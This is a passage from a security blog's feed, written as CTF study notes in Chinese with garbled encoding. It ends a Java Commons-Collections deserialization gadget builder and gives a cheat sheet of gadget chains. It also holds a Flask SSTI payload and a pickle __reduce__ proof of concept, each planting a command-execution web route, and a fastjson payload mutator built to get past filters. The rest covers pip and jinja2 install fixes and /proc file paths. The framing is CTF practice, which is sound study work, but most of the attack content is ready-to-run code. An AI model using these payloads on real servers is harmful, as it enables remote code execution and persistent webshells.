class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;godown&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templatesClass);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        map.remove(templatesClass);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazymapClass</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(factory, factory.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        factory.set(lazyMap, invokerTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line"><span class="comment">//        unserialize(&quot;cc6.ser&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806164241329.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806164241329.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat </tag>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF å¿«é€ŸæŸ¥ban</title>
      <link href="/2024/08/02/cc-ctf-kuai-su-cha-ban/"/>
      <url>/2024/08/02/cc-ctf-kuai-su-cha-ban/</url>
      
        <content type="html"><![CDATA[<h2 id="Common-Collections"><a href="#Common-Collections" class="headerlink" title="Common-Collections"></a>Common-Collections</h2><p>CCé“¾</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802170805620.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802170805620.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="trickç»•è¿‡"><a href="#trickç»•è¿‡" class="headerlink" title="trickç»•è¿‡"></a>trickç»•è¿‡</h2><p>RCEç»•è¿‡preg_match </p><p><a href="https://zhuanlan.zhihu.com/p/392606966">https://zhuanlan.zhihu.com/p/392606966</a></p><p>åå¼¹shellç»•è¿‡</p><p><a href="https://xz.aliyun.com/t/14240?u_atoken=587a65cb6338b3cc0d7fb5e0102746e4&u_asig=1a0c399817268327732403019e00a7">https://xz.aliyun.com/t/14240?u_atoken=587a65cb6338b3cc0d7fb5e0102746e4&amp;u_asig=1a0c399817268327732403019e00a7</a></p><p>kalié»˜è®¤çš„æ˜¯zsh<a href="https://so.csdn.net/so/search?q=zsh&spm=1001.2101.3001.7020"></a> shellï¼Œæ‰€ä»¥å¦‚æœæƒ³æŠŠkaliçš„shellç”¨bashåå¼¹å‡ºå»çš„è¯éœ€è¦å…ˆç”¨<strong>bashå‘½ä»¤è¿›å…¥bash shell</strong>æ‰èƒ½ä½¿ç”¨bashåå¼¹shell</p><h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><p>fastjsonç›®æ ‡ä¸å‡ºç½‘ï¼Œ&lt;&#x3D;1.2.24ä¸‹æ‰“BCELï¼Œéœ€è¦å›æ˜¾å¯ä»¥æ‰“å†…å­˜é©¬</p><p>ç›®æ ‡å‡ºç½‘ ï¼Œ&lt;&#x3D;1.2.47ï¼Œæ‰“JNDI</p><h2 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h2><p>ä¸€ä¸ªgadgetè¡”æ¥åˆé›†ï¼Œä»…ç»Ÿè®¡å¸¸ç”¨è¡”æ¥é“¾</p><p>BadAttributeValueExpException.readObject -&gt; toString</p><p>(jackson&#x2F;springboot) POJONode.toString -&gt; JSON.writeValueAsString -&gt;getter</p><p>(jackson) ObjectMapper.readValue -&gt; setter&#x2F;constructor&#x2F;getter</p><p>(jackson) JSONFactory.createParser -&gt; setter&#x2F;constructor</p><p>(fastjson) JSON.parse -&gt; setter</p><p>(fastjson) JSON.parseObject -&gt; settter&#x2F;getter</p><p>signedObject.getObject -&gt; readObject</p><p>JdbcRowSetImpl.setAutoCommit -&gt;  JNDI</p><p>(Tomcat) BasicDataSource.getConnection -&gt; Class.forName</p><p>(JDK8u65) AnnotationInvocationHandler.invoke -&gt; get</p><p>(jdk7u21&#x2F;8u20 rce) AnnotationInvocationHandler.equalsImpl -&gt; invoke </p><p>PriorityQueue.readObject -&gt; compare</p><p>(c3p0) ReferenceableUtils#ReferenceSerialized.referenceToObject -&gt; Reference JNDI</p><p>(rome) ToStringBean.toString -&gt; invoke</p><p>(tome) EqualsBean.beanEquals -&gt; invoke</p><p>(spring) XString.equals -&gt; toString</p><p>(spring) ClassPathXmlApplicationContext.ClassPathXmlApplicationContext -&gt; spELæ³¨å…¥</p><h3 id="CC-Gadget"><a href="#CC-Gadget" class="headerlink" title="CC Gadget"></a>CC Gadget</h3><p>CC Gadgetæçº¯</p><p>TransformedMap.checkSetValue -&gt; transform (CC1)</p><p>LazyMap.get -&gt; transform (CC1)</p><p>TransformingComparator.compare -&gt; transform (CC2)</p><p>TiedMapEntry.hashCode -&gt; get (CC3)</p><p>TrAXFilter.TrAXFilter -&gt; newTransformer (CC3)</p><p>TiedMapEntry.toString -&gt; getValue -&gt; get (CC5)</p><h3 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h3><p>ä¸€èˆ¬jwtç›´æ¥ç ´è§£ä¸äº†çš„ï¼Œè€ƒè™‘åŸå‹é“¾æ±¡æŸ“keyã€‚ä¸€èˆ¬jwtè€ƒé¢˜éƒ½ä¼´éšäº†åŸå‹é“¾æ±¡æŸ“</p><h3 id="hessian"><a href="#hessian" class="headerlink" title="hessian"></a>hessian</h3><p>hessianæ‰“TemplatesImplä¸èƒ½readObjectåˆå§‹åŒ–tfactoryï¼Œç›´æ¥SignedObject-&gt;TemplatesImpl</p><h3 id="æ— å›æ˜¾é—®é¢˜"><a href="#æ— å›æ˜¾é—®é¢˜" class="headerlink" title="æ— å›æ˜¾é—®é¢˜"></a>æ— å›æ˜¾é—®é¢˜</h3><h4 id="flask-SSTIæ— å›æ˜¾"><a href="#flask-SSTIæ— å›æ˜¾" class="headerlink" title="flask SSTIæ— å›æ˜¾"></a>flask SSTIæ— å›æ˜¾</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a.__init__.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell3%27,%20%27shell2%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27ls%20/%27)).read())%22,&#123;%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="pickleä¸å‡ºç½‘æ— å›æ˜¾"><a href="#pickleä¸å‡ºç½‘æ— å›æ˜¾" class="headerlink" title="pickleä¸å‡ºç½‘æ— å›æ˜¾"></a>pickleä¸å‡ºç½‘æ— å›æ˜¾</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">genpoc</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;import sys</span></span><br><span class="line"><span class="string">sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].debug=False</span></span><br><span class="line"><span class="string">sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].add_url_rule(&#x27;/shell1&#x27;,&#x27;shell1&#x27;,lambda :__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read())&quot;&quot;&quot;</span>  <span class="comment"># è¦æ‰§è¡Œçš„å‘½ä»¤</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exec</span>, (s,)        <span class="comment"># reduceå‡½æ•°å¿…é¡»è¿”å›å…ƒç»„æˆ–å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line">basepoc = base64.b64encode(poc)</span><br><span class="line"><span class="built_in">print</span>(basepoc)</span><br></pre></td></tr></table></figure><h2 id="otheréªšæŠ¥é”™è§£å†³"><a href="#otheréªšæŠ¥é”™è§£å†³" class="headerlink" title="otheréªšæŠ¥é”™è§£å†³"></a>otheréªšæŠ¥é”™è§£å†³</h2><p>request.form.get()æ˜¯æ¥æ”¶POSTè¡¨å•ï¼Œä¸”è¡¨å•çš„Content-Typeæ˜¯application&#x2F;x-www-form-urlencodedï¼ˆå¥½åƒè¿˜èƒ½æ¥æ”¶ä¸€ä¸ªï¼‰ï¼Œåæ­£ä¸èƒ½æ˜¯application&#x2F;json</p><p>POSTæ•°æ®éœ€è¦urlè½¬ä¹‰ä¸€ä¸‹ï¼Œæ¯”å¦‚roleæœ¬æ¥åŠ å¯†å‡ºæ¥æ˜¯<code>role=&quot;ax5K/oHZwZnVglrUvxHLK+qzifNPoCLMDMYZ6CaH1kY=&quot;</code>ï¼Œä¼ è¿‡å»<code>+</code>å› ä¸ºURLç¼–ç å˜ä¸ºç©ºæ ¼ï¼Œæ‰€ä»¥AESè§£å¯†å¤±è´¥</p><h3 id="ideaæ–‡ä»¶å’–å•¡æ¯é—®é¢˜"><a href="#ideaæ–‡ä»¶å’–å•¡æ¯é—®é¢˜" class="headerlink" title="ideaæ–‡ä»¶å’–å•¡æ¯é—®é¢˜"></a>ideaæ–‡ä»¶å’–å•¡æ¯é—®é¢˜</h3><p>idea javaæ–‡ä»¶å˜æˆèŒ¶æ¯æ˜¯æ²¡åŠæ³•è°ƒè¯•å’Œfind Usagesçš„ï¼Œéœ€è¦æŠŠæºä»£ç ç›®å½•æ ‡è®°ä¸ºæºä»£ç æ ¹ç›®å½•ã€‚æ¯”å¦‚åˆ†æTomcatæºç ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922205013696.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922205013696.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="jinja2å®‰è£…é—®é¢˜"><a href="#jinja2å®‰è£…é—®é¢˜" class="headerlink" title="jinja2å®‰è£…é—®é¢˜"></a>jinja2å®‰è£…é—®é¢˜</h3><p>jinja2 æŠ¥cannot import name â€˜Markupâ€˜ from â€˜jinja2â€˜</p><ol><li>å…ˆå¸è½½å·²ç»å®‰è£…çš„jinja2:<br><code>pip uninstall jinja2</code></li><li>å®‰è£… 2.11.3ç‰ˆæœ¬ï¼ˆç›®å‰å·²çŸ¥è¯¥ç‰ˆæœ¬æœ‰â€˜Markupâ€™æ¨¡å—ï¼‰<br><code>pip install jinja2==2.11.3</code></li><li>ç„¶åæŠ¥â€™soft_unicodeâ€™ from â€˜markupsafeâ€™</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install markupsafe==2.0.1</span><br></pre></td></tr></table></figure><ol start="4"><li>æŠ¥import name â€˜url_quoteâ€™ from â€˜werkzeug.urlsâ€™</li></ol><p>pip listæ‰¾åˆ°flaskç‰ˆæœ¬</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928145905945.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928145905945.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240928145905945"></p><p>è®¿é—®flaskæºç </p><p><a href="https://github.com/pallets/flask">https://github.com/pallets/flask</a></p><p>æ‰¾åˆ°å¯¹åº”çš„tagï¼Œè®¿é—®setup.py</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928150112011.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928150112011.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240928150112011"></p><p>å°è¯•æŠŠwerkzeugé™åˆ°0.14</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928150315423.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928150315423.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240928150315423"></p><h3 id="fenjingå®‰è£…é—®é¢˜"><a href="#fenjingå®‰è£…é—®é¢˜" class="headerlink" title="fenjingå®‰è£…é—®é¢˜"></a>fenjingå®‰è£…é—®é¢˜</h3><ul><li>jinja ssti ç¥å™¨ fenjingå®‰è£…ï¼š</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pipx install fenjing</span><br><span class="line">pipx run fenjing webui</span><br></pre></td></tr></table></figure><p>pythonåˆ›å»ºè™šæ‹Ÿç¯å¢ƒåï¼ˆpycharmèƒ½åˆ›å»ºè™šæ‹Ÿvenvï¼‰ï¼Œåœ¨ venv\Scripts\ç›®å½•ä¸‹ä½¿ç”¨activateè¿›å…¥è™šæ‹Ÿç¯å¢ƒå‘½ä»¤è¡Œï¼Œpipä¸‹è½½è™šæ‹Ÿç¯å¢ƒä¾èµ–åŒ…ã€‚(æ³¨æ„pipæ—¶å…³æ‰ä»£ç†ï¼Œæ¸…åæºå±è”½å›½å¤–æµé‡)</p><h3 id="nodejsåŸå‹é“¾æ±¡æŸ“æ— æ•ˆé—®é¢˜"><a href="#nodejsåŸå‹é“¾æ±¡æŸ“æ— æ•ˆé—®é¢˜" class="headerlink" title="nodejsåŸå‹é“¾æ±¡æŸ“æ— æ•ˆé—®é¢˜"></a>nodejsåŸå‹é“¾æ±¡æŸ“æ— æ•ˆé—®é¢˜</h3><p>nodejsåŸå‹é“¾æ±¡æŸ“è®°å¾—æ”¹Content-Typeä¸ºapplication&#x2F;json</p><p>nodejsæœ‰åŸå‹é“¾æ±¡æŸ“ï¼Œpythonä¹Ÿæœ‰</p><h3 id="procS-ctfå¸¸ç”¨æ–‡ä»¶ä¿¡æ¯"><a href="#procS-ctfå¸¸ç”¨æ–‡ä»¶ä¿¡æ¯" class="headerlink" title="procS ctfå¸¸ç”¨æ–‡ä»¶ä¿¡æ¯"></a>procS ctfå¸¸ç”¨æ–‡ä»¶ä¿¡æ¯</h3><p>è¿›è¡Œå†…ç½‘æ¢æµ‹æ—¶å¯ä»¥è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc/net/arp</span><br><span class="line">/etc/host</span><br></pre></td></tr></table></figure><p>proc&#x2F;è¿›ç¨‹å·&#x2F;cmlineå­˜å‚¨ç€å¯åŠ¨å½“å‰ç¨‹åºçš„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/2889/cmdline</span><br></pre></td></tr></table></figure><p>cwdæ–‡ä»¶å­˜å‚¨äº†å½“å‰è¿›ç¨‹ç¯å¢ƒçš„è¿è¡Œç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/1289/cwd</span><br></pre></td></tr></table></figure><p>proc&#x2F;selfè¡¨ç¤ºå½“å‰è¿›ç¨‹ç›®å½•ã€‚ç­‰åŒäº&#x2F;proc&#x2F;æœ¬è¿›ç¨‹idã€‚æ‰€ä»¥è·å–å½“å‰è¿›ç¨‹å‘½ä»¤ä¹Ÿå¯ä»¥ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/cmdline</span><br></pre></td></tr></table></figure><h3 id="é™æ€ä»£ç å—æ‰§è¡Œé—®é¢˜"><a href="#é™æ€ä»£ç å—æ‰§è¡Œé—®é¢˜" class="headerlink" title="é™æ€ä»£ç å—æ‰§è¡Œé—®é¢˜"></a>é™æ€ä»£ç å—æ‰§è¡Œé—®é¢˜</h3><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œç±»åŠ è½½åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241020173306426.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241020173306426.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241020173306426"></p><p>å¯ç®€å•è®¤ä¸º<code>åŠ è½½è¿æ¥-&gt;åˆå§‹åŒ–-&gt;å®ä¾‹åŒ–-&gt;ä½¿ç”¨</code></p><p>å…¶ä¸­åŠ è½½è¿æ¥ä»€ä¹ˆä»£ç å—éƒ½ä¸ä¼šè°ƒç”¨ï¼Œåˆå§‹åŒ–ä¼šè°ƒç”¨é™æ€ä»£ç å—ï¼Œå®ä¾‹åŒ–è°ƒç”¨æ„é€ ä»£ç å—å’Œæ„é€ æ–¹æ³•</p><ul><li>è°ƒç”¨é™æ€æ–¹æ³•ä¼šæ‰§è¡Œï¼šé™æ€ä»£ç å—ï¼Œé™æ€æ–¹æ³•</li><li>ç»™é™æ€å±æ€§èµ‹å€¼ï¼šé™æ€ä»£ç å—</li><li>è°ƒç”¨æ„é€ æ–¹æ³•ï¼šé™æ€ä»£ç å—ï¼Œæ„é€ ä»£ç å—ï¼Œæ„é€ æ–¹æ³•</li><li>Person.classï¼šä»€ä¹ˆéƒ½ä¸ä¼šæ‰§è¡Œ</li></ul><p>åŠ¨æ€åŠ è½½è°ƒç”¨æ€»ç»“å¦‚ä¸‹</p><ul><li><p>é»˜è®¤Class.forNameï¼šé™æ€ä»£ç å—</p></li><li><p>Class.forNameç¬¬äºŒä¸ªå‚æ•°ä¼ falseï¼šä»€ä¹ˆéƒ½ä¸ä¼šæ‰§è¡Œï¼ˆä¸åˆå§‹åŒ–ç‰ˆï¼‰</p></li><li><p>ClassLoader.loadClassï¼šä»€ä¹ˆéƒ½ä¸ä¼šæ‰§è¡Œï¼ä¸è¿›è¡Œåˆå§‹åŒ–</p></li><li><p>defineClassï¼šä»€ä¹ˆéƒ½ä¸åš</p></li></ul><p>ä¸€ä¸ªfuzzing fastjsonçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> JSONDecodeError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FastJsonPayload</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, base_payload</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            json.loads(base_payload)</span><br><span class="line">        <span class="keyword">except</span> JSONDecodeError <span class="keyword">as</span> ex:</span><br><span class="line">            <span class="keyword">raise</span> ex</span><br><span class="line">        self.base_payload = base_payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_common</span>(<span class="params">self, payload, func</span>):</span><br><span class="line">        tmp_payload = json.loads(payload)</span><br><span class="line">        dct_objs = [tmp_payload]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(dct_objs) &gt; <span class="number">0</span>:</span><br><span class="line">            tmp_objs = []</span><br><span class="line">            <span class="keyword">for</span> dct_obj <span class="keyword">in</span> dct_objs:</span><br><span class="line">                <span class="keyword">for</span> key <span class="keyword">in</span> dct_obj:</span><br><span class="line">                    <span class="keyword">if</span> key == <span class="string">&quot;@type&quot;</span>:</span><br><span class="line">                        dct_obj[key] = func(dct_obj[key])</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">type</span>(dct_obj[key]) == <span class="built_in">dict</span>:</span><br><span class="line">                        tmp_objs.append(dct_obj[key])</span><br><span class="line">            dct_objs = tmp_objs</span><br><span class="line">        <span class="keyword">return</span> json.dumps(tmp_payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¯¹@typeçš„valueå¢åŠ Lå¼€å¤´ï¼Œ;ç»“å°¾çš„payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload1</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.gen_common(payload, <span class="keyword">lambda</span> v: <span class="string">&quot;L&quot;</span> + v + <span class="string">&quot;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¯¹@typeçš„valueå¢åŠ LLå¼€å¤´ï¼Œ;;ç»“å°¾çš„payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload2</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.gen_common(payload, <span class="keyword">lambda</span> v: <span class="string">&quot;LL&quot;</span> + v + <span class="string">&quot;;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¯¹@typeçš„valueè¿›è¡Œ\u</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload3</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.gen_common(payload,</span><br><span class="line">                               <span class="keyword">lambda</span> v: <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\u&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> v.encode())).replace(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¯¹@typeçš„valueè¿›è¡Œ\x</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload4</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.gen_common(payload,</span><br><span class="line">                               <span class="keyword">lambda</span> v: <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> v.encode())).replace(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç”Ÿæˆcacheç»•è¿‡payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload5</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        cache_payload = &#123;</span><br><span class="line">            <span class="string">&quot;rand1&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">                <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cache_payload[<span class="string">&quot;rand2&quot;</span>] = json.loads(payload)</span><br><span class="line">        <span class="keyword">return</span> json.dumps(cache_payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">self</span>):</span><br><span class="line">        payloads = []</span><br><span class="line"></span><br><span class="line">        payload1 = self.gen_payload1(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload1</span><br><span class="line"></span><br><span class="line">        payload2 = self.gen_payload2(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload2</span><br><span class="line"></span><br><span class="line">        payload3 = self.gen_payload3(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload3</span><br><span class="line"></span><br><span class="line">        payload4 = self.gen_payload4(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload4</span><br><span class="line"></span><br><span class="line">        payload5 = self.gen_payload5(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload5</span><br><span class="line"></span><br><span class="line">        payloads.append(payload1)</span><br><span class="line">        payloads.append(payload2)</span><br><span class="line">        payloads.append(payload5)</span><br><span class="line"></span><br><span 